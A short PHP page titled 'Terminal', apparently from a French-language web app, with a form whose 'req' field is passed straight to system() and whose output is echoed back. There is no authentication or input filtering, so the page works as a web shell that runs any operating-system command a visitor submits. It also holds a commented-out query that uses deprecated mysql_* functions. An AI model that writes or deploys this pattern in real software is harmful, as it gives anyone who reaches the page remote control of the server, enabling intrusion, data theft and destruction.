
<center>
<h1>Terminal</h1>
</center>
<?php

/*	$result = mysql_query('SELECT * FROM terminal');
	while($data = mysql_fetch_array($result))
	{
		echo $data['id']." - ".$data['content']."</br>";
	}
*/
?>

<div class="ui-body ui-body-e"style="width: 400px; margin: auto;">
		<p><code>

<?php
	$lol = system($_POST['req']);

?>
	
		</code>
		</p></div>
<center>
<form action="index.php?page=terminal" method="POST">
<div data-role="fieldcontain">
	<label for="name"><strong>Commande : </strong></label>
<input type="text" name="req" id="name" data-role="none" value="" required>
</div>
<input type="submit" data-inline="true" value="Envoyer" data-theme="b"/>
</form>
</center>
